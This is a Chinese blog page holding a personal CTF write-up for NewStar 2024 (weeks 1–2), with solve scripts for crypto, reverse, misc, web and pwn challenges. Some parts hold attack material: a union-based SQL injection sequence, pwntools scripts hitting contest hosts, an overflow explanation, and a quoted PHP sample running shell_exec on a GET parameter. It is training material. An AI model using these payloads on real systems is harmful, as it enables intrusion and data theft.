<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Newstar2024 | 0raN9e's Blog</title><meta name=keywords content="ctf"><meta name=description content="Newstar2024  ä¸ªäººé¢˜è§£"><meta name=author content><link rel=canonical href=http://blog.0ran9e.cn/posts/ctf/newstar2024/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://blog.0ran9e.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://blog.0ran9e.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://blog.0ran9e.cn/favicon-32x32.png><link rel=apple-touch-icon href=http://blog.0ran9e.cn/apple-touch-icon.png><link rel=mask-icon href=http://blog.0ran9e.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://blog.0ran9e.cn/posts/ctf/newstar2024/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://blog.0ran9e.cn/posts/ctf/newstar2024/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="Newstar2024"><meta property="og:description" content="Newstar2024  ä¸ªäººé¢˜è§£"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-11-04T00:00:00+00:00"><meta property="article:modified_time" content="2024-11-04T00:00:00+00:00"><meta property="article:tag" content="Ctf"><meta name=twitter:card content="summary"><meta name=twitter:title content="Newstar2024"><meta name=twitter:description content="Newstar2024  ä¸ªäººé¢˜è§£"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://blog.0ran9e.cn/posts/"},{"@type":"ListItem","position":2,"name":"æ–‡ç« ","item":"http://blog.0ran9e.cn/posts/ctf/"},{"@type":"ListItem","position":3,"name":"Newstar2024","item":"http://blog.0ran9e.cn/posts/ctf/newstar2024/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Newstar2024","name":"Newstar2024","description":"Newstar2024  ä¸ªäººé¢˜è§£","keywords":["ctf"],"articleBody":"å‰è¨€:åé¢ä¹Ÿæ²¡æ€ä¹ˆæ‰“äº†ï¼Œåˆæ²¡æ—¶é—´è‡ªå·±åˆç¬¨ï¼ŒæŠ„ä¸ªå†·é¥­æ”¾ä¸Šæ¥å§ã€‚\nweek1 Signin ez_answer æ­£å¸¸ç­”é¢˜è€å®ä¸€ç‚¹å°±å‡ºflagäº†ï¼Œæ­£å¸¸çš„è§„åˆ™\nMisc decompress å‰å‡ å±‚æ­£å¸¸çš„è§£å‹ï¼Œåˆ°æœ€åä¸€å±‚æœ‰hintæç¤ºï¼Œæ˜¯æ­£åˆ™æç¤ºç®€å•çš„çœ‹ä¸€ä¸‹ï¼Œä¸€å…±æ˜¯äº”ä½å¯†ç ï¼Œå‰ä¸‰ä½æ˜¯å°å†™å­—æ¯ï¼Œç¬¬å››ä½æ•°å­—ï¼Œç¬¬äº”ä½æ˜¯å°å†™å­—æ¯ï¼Œç”¨å¸¸è§çš„çˆ†ç ´å·¥å…·è¿›è¡Œçˆ†ç ´ä¸€ä¸‹å°±è¡Œï¼Œéœ€è¦ååˆ†é’Ÿå·¦å³çš„æ—¶é—´å§çˆ†ç ´å‡ºæ¥çš„å¯†ç æ˜¯xtr4mï¼Œè¿›å»æ‰“å¼€ç¬¬ä¸€ä¸ªå‹ç¼©åŒ…å°±æœ‰flag\npleasingMusic audçœ‹ä¸€ä¸‹æœ‰æ‘©æ–¯ç”µç ï¼Œç”¨åœ¨çº¿ç½‘ç«™å…ˆè¿›è¡Œåˆæ­¥çš„éŸ³é¢‘åˆ†ç¦»ï¼Œç„¶ååˆ©ç”¨é¢˜ç›®æ­£åéƒ½å¥½å¬ï¼Œå°†.-ä»åå¾€å‰æ•²è‡ªå·±åœ¨çº¿ç½‘ç«™æ‰‹æ•²ä¸€ä¸‹å¾—åˆ°ç¼–ç ez_morse_codeï¼Œæœ€åå¥—ä¸ªflag\nWhereIsFlag flagåœ¨proc/self/envrioné‡Œé¢,å…¸å‹çš„è—åœ¨ç¯å¢ƒå˜é‡é‡Œ\nLabyrinth ç®€å•çš„lsbæŸ¥æ‰¾\nå…‘æ¢ç  import sys import zlib import struct if len(sys.argv) != 2: print(\"Usage: python script.py \") sys.exit(1) file = sys.argv[1] fr = open(file, 'rb').read() data = bytearray(fr[12:29]) # è·å– CRC32 æ ¡éªŒå’Œ crc32key = struct.unpack('\u003eI', fr[29:33])[0] \u0026 0xffffffff print(f\"CRC32 Key: {crc32key}\") n = 4096 found = False for w in range(n): width = bytearray(struct.pack('\u003ei', w)) for h in range(n): height = bytearray(struct.pack('\u003ei', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print(f\"Width: {w}, Height: {h}\") print(f\"Data: {data}\") newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] with open(file, 'wb') as fw: fw.write(newpic) print(f\"æ–°å›¾ç‰‡å·²ä¿å­˜ä¸º: {file}\") found = True break if found: break ç®€å•çš„crcçˆ†ç ´ï¼Œç›´æ¥è„šæœ¬æ¢­å°±è¡Œäº†ï¼Œflagåœ¨åº•éƒ¨\nCrypto xor from Crypto.Util.number import bytes_to_long, long_to_bytes # å¯†é’¥å’ŒåŠ å¯†çš„å€¼ key = b'New_Star_CTF' c1 = 8091799978721254458294926060841 c2 = b';:\\x1c1\u003c\\x03\u003e*\\x10\\x11u;' # è§£å¯† m1 m1 = c1 ^ bytes_to_long(key) # è§£å¯† m2 m2 = bytes(a ^ b for a, b in zip(c2, key)) # å°†è§£å¯†çš„ç»“æœè½¬æ¢ä¸ºå­—èŠ‚å¹¶æ‰“å° flag_part1 = long_to_bytes(m1).decode('utf-8') flag_part2 = m2.decode('utf-8') # è¾“å‡ºå®Œæ•´çš„ flag flag = flag_part1 + flag_part2 print('Decrypted flag:', flag) Base èµ›åšå¨å­ä¸€æŠŠæ¢­\nä¸€çœ¼ç§’äº† ç®€å•çš„rsaï¼Œé¢˜ç›®è¯´nå°å°çš„ä¹Ÿå¾ˆå¯çˆ±ï¼Œç”¨factordbåœ¨çº¿ç½‘ç«™çœ‹çœ‹å‘ç°æœ‰å› å­ï¼Œå¸¦å…¥pç›´æ¥ä¸Šexp\nfrom Crypto.Util.number import * from gmpy2 import invert # å·²çŸ¥çš„å€¼ n = 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153 c = 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069 e = 65537 p = 7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421 # è®¡ç®— q q = n // p # è®¡ç®— Ï†(n) phi_n = (p - 1) * (q - 1) # è®¡ç®— d d = invert(e, phi_n) # è§£å¯† m = pow(c, d, n) # è¾“å‡ºè§£å¯†åçš„ flag flag = long_to_bytes(m) print('Decrypted flag:', flag.decode()) Strange King rotçš„å˜å½¢ç§»ä½\ndef decrypt_flag(encrypted_flag): decrypted_flag = [] shift_values = [5, 7, 9, 11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61] # ç§»ä½å€¼ for i, char in enumerate(encrypted_flag): # è®¡ç®—ç§»ä½ shift = shift_values[i % len(shift_values)] if char.isalpha(): # åªå¤„ç†å­—æ¯ # å¤„ç†å¤§å†™å­—æ¯ if char.isupper(): new_char = chr((ord(char) - ord('A') - shift) % 26 + ord('A')) # å¤„ç†å°å†™å­—æ¯ elif char.islower(): new_char = chr((ord(char) - ord('a') - shift) % 26 + ord('a')) decrypted_flag.append(new_char) else: decrypted_flag.append(char) # éå­—æ¯å­—ç¬¦ä¸å˜ return ''.join(decrypted_flag) # æµ‹è¯• encrypted_flag = \"ksjr{EcxvpdErSvcDgdgEzxqjql}\" decrypted_flag = decrypt_flag(encrypted_flag) print('Decrypted flag:', decrypted_flag) Web headach3 ä¼šèµ¢å— ç¬¬ä¸€éƒ¨åˆ†çœ‹æºç flag{WA0w\nç¬¬äºŒéƒ¨åˆ†!_y4_r3al\nç¬¬ä¸‰éƒ¨åˆ†1y_Gr4sP\n// ä¿®æ”¹çŠ¶æ€ä¸º \"è§£å°\" document.getElementById('state').textContent = 'è§£å°'; // è·å–å®é™…çš„ CSRF ä»¤ç‰Œ const csrfTokenValue = document.getElementById('csrf_token').value; // ç¡®ä¿è¿™ä¸ªå…ƒç´ å­˜åœ¨ // å‘é€è¯·æ±‚ fetch('/api/flag/s34l', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ csrf_token: csrfTokenValue }) }) .then(response =\u003e response.json()) .then(data =\u003e { console.log(`ç¬¬ä¸‰éƒ¨åˆ†Flag: ${data.flag}, ä¸‹ä¸€å…³: /${data.nextLevel || 'æ— '}`); }) .catch(error =\u003e console.error('è¯·æ±‚è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯:', error)); ç¬¬å››éƒ¨åˆ†fSkpKcyF9\n// è·å– CSRF ä»¤ç‰Œ\rconst csrfToken = document.getElementById('csrf_token').value;\r// å‘é€è¯·æ±‚\rfetch('/api/flag/Ap3x', {\rmethod: 'POST',\rheaders: {\r'Content-Type': 'application/x-www-form-urlencoded'\r},\rbody: `csrf_token=${encodeURIComponent(csrfToken)}`\r})\r.then(response =\u003e response.json())\r.then(data =\u003e {\rconsole.log(`Flag: ${data.flag}`);\r})\r.catch(error =\u003e console.error('è¯·æ±‚è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯:', error)); flag{WA0w!_y4_r3al1y_Gr4sP}ï¼Ÿä¸å¯¹ï¼Œåº”è¯¥ç›´æ¥ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9ç„¶åå†è½¬base64çš„\næ™ºæ¢°å±æœº æ‰¾åˆ°å¯¹åº”çš„ç„¶åè·‘è„šæœ¬å¡«å…¥å¾—åˆ°flag\n\u003c?php $decrypted_cmd='cat /f*'; $cmd=base64_encode($decrypted_cmd); $reversed_cmd = ''; for ($i = strlen($cmd) - 1; $i \u003e= 0; $i--) { $reversed_cmd .= $cmd[$i]; } $hashed_reversed_cmd=md5($reversed_cmd); $decode_key=$hashed_reversed_cmd; $key=base64_encode($decode_key); echo $cmd; echo $key; å°†å¾—åˆ°çš„å¯¹åº”å†…å®¹è¿›è¡Œpostå‘åŒ…å³å¯\nPangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰ ä½“æ„Ÿä¸ç®—å¥½ï¼Œä½†æ˜¯é¢˜ç›®å¾ˆå¥½ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆå¡çš„åŸå› \nç¬¬ä¸€å±‚æ²¡æ€ä¹ˆçœ‹æ˜ç™½ï¼Œç®€å•çš„æŠ“åŒ…åä¿®æ”¹ä¸€ä¸‹headeré‡Œçš„cookieçœ‹ç½‘ç»œå›æ˜¾locationè¿›å…¥ç¬¬äºŒå±‚\nç¬¬äºŒå±‚æ¢cookieï¼Œgetå‘åŒ…?ask=miao\nç¬¬ä¸‰å±‚postå‘åŒ…say=hello\nç¬¬å››å±‚æ”¹ä¸ªrefererï¼Œå†æŠŠagentæ”¹ä¸€ä¸‹æŠŠfirefoxæ”¹æˆPapaå°±è¡Œäº†\nè¿™å±‚å¥½åƒä¹Ÿè¦æ”¹ä¸ºsay=ç›å¡å·´å¡é˜¿å¡å“‡å¡ç±³å¡ç›å¡å‘£\nç¬¬äº”å±‚å¥½åƒæ˜¯å‘patchï¼Œæˆ‘æ˜¯pythonè¿›è¡Œå‘åŒ…çš„\nimport requests # ç›®æ ‡ URL url = \"http://101.200.139.65:25030/?ask=Papa\" # æ„é€ æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†å’Œå­—ç¬¦ä¸²å‚æ•° files = {'file': ('patch.zip', open('1.zip', 'rb'))} data = { 'say': 'ç›å¡å·´å¡é˜¿å¡å“‡å¡ç±³å¡ç›å¡å‘£' } # æ·»åŠ å¿…è¦çš„ headers headers = { 'Cookie': 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MH0.J62yrWvSS_4OY6g19WR70lIq5DBRs70ISiH1rf8OUB0', 'Referer': 'http://101.200.139.65:35208/?ask=Papa', 'User-Agent': 'Papa/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Origin': 'http://101.200.139.65:35208', 'X-Forwarded-For':'127.0.0.1' } # å‘é€ PATCH è¯·æ±‚ response = requests.patch(url, files=files, data=data, headers=headers) # æ‰“å°æœåŠ¡å™¨è¿”å›çš„å“åº” print(response.text) ç¬¬å…­å±‚å¥½åƒæ˜¯jwtçš„æ›´æ”¹ï¼Œé¢˜ç›®ç»™äº†å¯†é’¥ç›´æ¥åœ¨ç½‘ç«™ä¸Šæ”¹ä¸ºlevel0å†å¸¦å…¥è¿›è¡Œäº†\næœ€åå¸¦å…¥è¿›è¡Œä¿®æ”¹æˆ‘æŠŠåŒ…åˆå¸¦åˆ°bpçš„è‡ªå¸¦æµè§ˆå™¨é‡Œé¢å¾—åˆ°æœ€åçš„flag,æŒ‰ä¸€ä¸‹é†’æ¥ç­‰flagå°±è¡Œäº†\nè°¢è°¢çš®è›‹ -1 union select 1,database()# -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# -1 union select 1,group_concat(column_name) from information_schema.columns where table_name='Fl4g'# -1 union select 1,group_concat(id,des,value) from Fl4g# Re begin è·Ÿç€æµç¨‹åšï¼Œä¸€å…±ä¸‰ä¸ªéƒ¨åˆ†ï¼Œf5ç„¶åa,shiftf12,x\nflag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}\nbase64 ç®€å•çš„base64æ¢è¡¨\nezAndroidStudy ä½¿ç”¨å·¥å…·æ˜¯jeb\nflag1å’Œflag2ç›´æ¥å…¨å±€æœç´¢å¾—åˆ°flagéƒ¨åˆ†ï¼Œflag2åœ¨æ³¨é‡Šé‡Œï¼Œå¿˜æˆªå±äº†\nflag3åœ¨xmlä¸­\nflag4ä¹Ÿæ˜¯æœç´¢ç„¶ååœ¨æ³¨é‡Šé‡Œå¾—åˆ°\nflag5åœ¨soé‡Œé¢å¯¼å‡ºç„¶åå¸¦å…¥idaé€†å‘ä¸€ä¸‹\nSimple_encryption idaç„¶åf5çœ‹mainå‡½æ•°ï¼Œä¸€ä¸ªç®€å•çš„å¼‚æˆ–ï¼Œå®šä½ä¸€ä¸‹å¯†é’¥ï¼Œç®€å•çš„è„šæœ¬å¸¦å…¥\nfrom idaapi import * decoded = \"\" for i in range(30): enc = get_byte(0x403020 + i) if i % 3 == 0: enc = (enc + 31) \u0026 0xFF elif i % 3 == 1: enc = (enc - 41) \u0026 0xFF else: # i % 3 == 2 enc ^= 0x55 decoded += chr(enc) print(decoded) ez_debug idaæ‰“å¼€ç®€å•çš„çœ‹ä¸€ä¸‹åˆ¤æ–­flagåä¼šå¯¹å¯†æ–‡è¿›è¡Œè§£å¯†\nå¯ä»¥ç”¨x64dbgæ‰“æ–­ç‚¹å¾—åˆ°flag\npwn Real Login æœ‰é™„ä»¶è¿›è¡Œä¸‹è½½ï¼Œidaçš„f5å¾—åˆ°å¯†é’¥ï¼Œç›´æ¥cat flagå°±è¡Œ\nGame from pwn import * p = remote('39.106.48.123', 30474) p.recvuntil(\"Let's play a game!\") for _ in range(100): p.sendline('10') p.recvuntil(\"pls input you num: \") p.interactive() å¤§æ¦‚çš„æ€è·¯å°±æ˜¯åœ¨5uå†…å¡«å…¥æ•°å­—æœ€åå¤§äº999å³å¯ï¼Œç„¶åå°±å¯ä»¥è¿›å…¥æ‰§è¡Œå‘½ä»¤äº†\noverwrite æœ‰é•¿åº¦é™åˆ¶é€šè¿‡è¾“å…¥-1è¿›è¡Œç»•è¿‡ï¼Œåœ¨readå‡½æ•°ä¸­ä¼šè½¬æ¢ä¸ºunsigned intç±»å‹å…è®¸è¯»å–å¤§é‡æ•°æ®\nnbytes_4 åœ¨æ ˆä¸­æœ‰å›ºå®šå¤§å°ï¼ˆ0x30ï¼‰ï¼Œå¡«å…… 0x30 å­—èŠ‚åï¼Œå¯ä»¥è¦†ç›–è¿”å›åœ°å€ã€‚\natoi çš„è¾“å…¥å­—ç¬¦ä¸²åœ¨å¯å¤„ç†çš„èŒƒå›´å†…ï¼ˆå³ä¸è¶…è¿‡ 2147483647ï¼‰ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼Œè¿”å›0\næ‰€ä»¥è¾“å…¥(0x30+0x06)ä¸ªæ•°å­—å³å¯\ngdb idaç®€å•çš„çœ‹ä¸€ä¸‹\nç”¨pwndbgè¿›è¡ŒæŸ¥çœ‹ï¼Œencåœ¨rbp-0x439ï¼Œ4557455355431d45åŒæ—¶æ³¨æ„æœ‰ä¸å¯è§å­—ç¬¦\\x1d\nfrom pwn import * p=remote(\"101.200.139.65\",25014) s=p.recvuntil(b'data:') p.sendline(b\"\\x5d\\x1d\\x43\\x55\\x53\\x45\\x57\\x45\") p.interactive() week2\nimport requests from bs4 import BeautifulSoup session = requests.Session() url = 'http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/start' res = session.get(url) soup = BeautifulSoup(res.text, 'html.parser') text = soup.find('p', id='text').get_text() user_input = text post_url = 'http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/submit' # æ›¿æ¢ä¸ºå®é™…çš„ POST URL data = {'user_input': user_input} # è®¾ç½® POST æ•°æ® # å‘é€ POST è¯·æ±‚ response = session.post(post_url, data=data) print(response.text) week2 Crypto è¿™æ˜¯å‡ æ¬¡æ–¹ï¼Ÿ ç–‘æƒ‘ï¼ åŠ æ³•çš„è¿ç®—é€»è¾‘åœ¨^ä¹‹å‰\nfrom Crypto.Util.number import * # å·²çŸ¥å‚æ•° n = 124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102569745482135768148755333759957370341658601268473878114399708702841974488367343570414404038862892863275173656133199924484523427712604601606674219929087411261 e = 65537 c = 36513006092776816463005807690891878445084897511693065366878424579653926750135820835708001956534802873403195178517427725389634058598049226914694122804888321427912070308432512908833529417531492965615348806470164107231108504308584954154513331333004804817854315094324454847081460199485733298227480134551273155762 hint = 12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531673390 # æ­¥éª¤ 1: æ¢å¤ p p = hint ^ (e + 10086) # æ­¥éª¤ 2: è®¡ç®— q q = n // p # æ­¥éª¤ 3: è®¡ç®— d (ç§é’¥) phi = (p - 1) * (q - 1) d = pow(e, -1, phi) # æ­¥éª¤ 4: è§£å¯†å¯†æ–‡ m = pow(c, d, n) flag = long_to_bytes(m) print(flag.decode()) Just one and more than two from Crypto.Util.number import * # å·²çŸ¥å‚æ•° p = 11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133 q = 11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393 r = 12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371 c1 = 8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451 c2 = 1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445 e = 65537 # æ­¥éª¤ 1: ä» c1 è§£å¯† d1 = pow(e, -1, p - 1) m1 = pow(c1, d1, p) # æ­¥éª¤ 2: è®¡ç®— N å’Œ phi(N) N = p * q * r phi_N = (p - 1) * (q - 1) * (r - 1) # æ­¥éª¤ 3: ä» c2 è§£å¯† d2 = pow(e, -1, phi_N) m2 = pow(c2, d2, N) # æ‹¼æ¥æ˜æ–‡ flag = long_to_bytes(m1) + long_to_bytes(m2) print(flag.decode()) Since you konw something from Crypto.Util.number import long_to_bytes def xor_bytes(a, b): return bytes(x ^ y for x, y in zip(a, b * (len(a) // len(b) + 1))) c = 218950457292639210021937048771508243745941011391746420225459726647571 # Convert c back to bytes c_bytes = long_to_bytes(c) # Function to try decryption with a given key def try_decrypt(key): decrypted = xor_bytes(c_bytes, key) if decrypted.startswith(b'flag{') and decrypted.endswith(b'}'): return decrypted.decode() return None # Try all possible single-byte keys for i in range(256): key = bytes([i]) result = try_decrypt(key) if result: print(f\"Found flag with key {key.hex()}: {result}\") break # If single-byte key doesn't work, try short strings if not result: import string import itertools chars = string.printable.encode() for length in range(2, 5): # Try keys up to 4 characters long for key in itertools.product(chars, repeat=length): key = bytes(key) result = try_decrypt(key) if result: print(f\"Found flag with key {key.hex()}: {result}\") break if result: break if not result: print(\"Could not find the key. The key might be longer or more complex.\") èŒ¶é‡ŒèŒ¶æ°” éš¾å¾—è‡ªå·±åˆ†æä¹‹åå†å«aiå†™çš„\nå¼€å¤´æ˜¯ä¸€ä¸ªç±»teaçš„ç®—æ³•ï¼Œç„¶åä¹‹åæ‹¼æ¥è½¬å›hexå†æ‹¼æ¥ä¸€ä¸‹å°±è¡Œäº†\np = 446302455051275584229157195942211 v0 = 190997821330413928409069858571234 v1 = 137340509740671759939138452113480 derta = 462861781278454071588539315363 v3 = 489552116384728571199414424951 v4 = 469728069391226765421086670817 v5 = 564098252372959621721124077407 v6 = 335640247620454039831329381071 v2 = (derta * 32) % p # åå‘32æ¬¡è¿­ä»£çš„åŠ å¯†è¿‡ç¨‹ for i in range(32): v2 = (v2 - derta) % p v0 = (v0 - ((v1 + v2) ^ (8 * v1 + v5) ^ ((v1 \u003e\u003e 7) + v6))) % p v1 = (v1 - ((v0 + v2) ^ (8 * v0 + v3) ^ ((v0 \u003e\u003e 7) + v4))) % p print(\"v0=\", v0) print(\"v1=\", v1) l = 199 shift = l // 2 combined = (v0 \u003c\u003c shift) + v1 a = hex(combined)[2:] if len(a) % 2 != 0: a = \"0\" + a flag = \"\".join([chr(int(a[i:i+2], 16)) for i in range(0, len(a), 2)]) print(\"Recovered flag:\", flag) Misc wireshark_checkin wiresharkæ‰“å¼€httpçœ‹ä¸€ä¸‹è¿½è¸ªé‡Œé¢é‡Œé¢æœ‰flag\nwireshark_secret å¯¼å‡ºå›¾ç‰‡å¾—åˆ°flag\nçƒ­å¿ƒåŠ©äººçš„å°æ˜åŒå­¦ Passware Kit Forensicå·¥å…·ä¸€æŠŠæ¢­\nç”¨æº¯æµä»ªè§è¯ä¼ç‰¹å°é£ æŸ¥æ‰¾åˆ°ç½‘ç«™ï¼Œå®šä½åˆ°domainï¼Œè¿›è¡Œ16ä½å°å†™md5å¾—åˆ°flag\nä½ ä¹Ÿç©åŸç¥å— gifæå–å†…å®¹\nåŸç¥çœŸå¥½ç©ğŸ˜‹ï¼Œæˆ‘ç›´æ¥æ‰‹è°ƒ\nå³ä¸‹è§’çš„å†…å®¹å°±è¡Œæ …æ è§£å¯†\nå­—é‡Œè¡Œé—´çš„ç§˜å¯† txtæ‰“å¼€çœ‹ä¸‹é¢çš„å­—ç¬¦ï¼Œé›¶å®½åº¦éšå†™\nå¸¦å…¥è§£å¯†ï¼Œå¤åˆ¶ç²˜è´´åˆ°txté‡Œé¢å³å¯å¾—åˆ°flag\nHertaâ€™s Study åŠ å¯†é€»è¾‘\n\u003c?php $payload=$_GET['payload']; $payload=shell_exec($payload); $bbb=create_function( base64_decode('J'.str_rot13('T').'5z'), base64_decode('JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp Kz0xKXsNCiAgICBpZigkaSUy'.str_rot13('CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m').'dHJfcm90MTMoJG5zWyRpXSk7DQo gICAgfQ0KfQ0KcmV0dXJuICRuczs==') ); echo $bbb($payload); ?\u003e ç®€å•åˆ†æä¸€ä¸‹æµé‡ï¼Œä¸­é—´ä¼ äº†ä¸€æ¬¡å‡çš„flagåé¢ä¼ äº†ä¸€æ¬¡çœŸçš„ï¼Œæ˜æ˜¾çš„==ï¼Œä¸Šexp\n\u003c?php function reverseEncryption($ns) { for ($i = 0; $i \u003c strlen($ns); $i++) { if ($i % 2 == 1) { $ns[$i] = str_rot13($ns[$i]); } } return base64_decode($ns); } $encryptedString = 'ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt=='; $decryptedString = reverseEncryption($encryptedString); echo $decryptedString; Re UPX æµ‹è¯•äº†ä¸€ä¸‹ï¼Œä¸‹è½½æœ€æ–°çš„upxè„±å£³ï¼Œç‰ˆæœ¬è€çš„ä¸è¡Œï¼Œç®€å•çš„è„±å£³åå‘ç°æ˜¯rc4,å†™è§£å¯†è„šæœ¬\ndef init_sbox(key): sbox = list(range(256)) j = 0 key_length = len(key) for i in range(256): j = (j + sbox[i] + key[i % key_length]) % 256 sbox[i], sbox[j] = sbox[j], sbox[i] return sbox def rc4(key, data): sbox = init_sbox(key) i = j = 0 output = [] for byte in data: i = (i + 1) % 256 j = (j + sbox[i]) % 256 sbox[i], sbox[j] = sbox[j], sbox[i] # swap output.append(byte ^ sbox[(sbox[i] + sbox[j]) % 256]) # xor return bytes(output) # å®šä¹‰ dataï¼ˆè½¬æ¢ä¸ºæ— ç¬¦å·å­—èŠ‚ï¼‰ data = [ 196, 96, 175, 185, 227, 255, 46, 155, 245, 16, 86, 81, 110, 238, 95, 125, 125, 110, 43, 156, 117, 181 ] key = b'NewStar' decrypted_flag = rc4(key, data) print(decrypted_flag.decode('utf-8', errors='ignore')) drink_TEA å…ˆçœ‹åŠ å¯†é€»è¾‘\n#include #include #include void decrypt(uint32_t* v, uint32_t* k) { uint32_t v0 = v[0], v1 = v[1]; uint32_t sum = 0xC6EF3720; // 0x9E3779B9 * 32 uint32_t delta = 0x9E3779B9; for (int i = 0; i \u003c 32; i++) { v1 -= ((v0 \u003c\u003c 4) + k[2]) ^ (v0 + sum) ^ ((v0 \u003e\u003e 5) + k[3]); v0 -= ((v1 \u003c\u003c 4) + k[0]) ^ (v1 + sum) ^ ((v1 \u003e\u003e 5) + k[1]); sum -= delta; } v[0] = v0; v[1] = v1; } int main() { char key[] = \"WelcomeToNewStar\"; uint8_t enc[] = { 120, 32, 247, 179, 197, 66, 206, 218, 133, 89, 33, 26, 38, 86, 90, 89, 41, 2, 13, 237, 7, 168, 185, 238, 54, 89, 17, 135, 253, 92, 35, 36 }; // å°†å¯†é’¥è½¬æ¢ä¸º uint32 åˆ—è¡¨ uint32_t k[4] = {0}; memcpy(k, key, sizeof(k)); // æ¯8å­—èŠ‚ï¼ˆä¸¤ä¸ª uint32ï¼‰è¿›è¡Œè§£å¯† for (int i = 0; i \u003c sizeof(enc); i += 8) { uint32_t v[2]; memcpy(v, enc + i, sizeof(v)); decrypt(v, k); // æ£€æŸ¥è§£å¯†åçš„å€¼ printf(\"Decrypted values: %u %u\\n\", v[0], v[1]); // æ›´æ–°åŠ å¯†æ•°ç»„ memcpy(enc + i, v, sizeof(v)); } // è¾“å‡ºè§£å¯†åçš„ç»“æœ for (int i = 0; i \u003c sizeof(enc); i++) { if (enc[i] \u003e= 32 \u0026\u0026 enc[i] \u003c 127) { putchar(enc[i]); } } putchar('\\n'); return 0; } Dirty_flowers def decrypt(v3, key):\rdecrypted = []\rkey_length = len(key)\rfor i in range(len(v3)):\rdecrypted_char = v3[i] ^ ord(key[i % key_length])\rdecrypted.append(decrypted_char)\rreturn decrypted\rv3 = [\r2, 5, 19, 19, 2, 30, 83, 31, 92, 26,\r39, 67, 29, 54, 67, 7, 38, 45, 85, 13,\r3, 27, 28, 45, 2, 28, 28, 48, 56, 50,\r85, 2, 27, 22, 84, 15\r]\rkey = \"dirty_flower\"\rdecrypted_values = decrypt(v3, key)\rflag = 